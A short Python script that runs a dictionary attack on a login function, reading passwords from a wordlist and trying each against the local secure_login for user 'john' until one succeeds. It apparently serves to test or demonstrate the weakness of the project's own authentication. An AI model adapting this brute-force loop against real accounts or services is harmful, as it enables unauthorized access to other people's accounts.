from auth import secure_login

username = "john"

with open("wordlist.txt", "r") as file:
    for line in file:
        password = line.strip()
        print(f"Trying: {password}")

        user, session, msg = secure_login(username, password)

        if user:
            print(f"\n🔥 SUCCESS! Password found: {password}")
            break
        else:
            print(msg)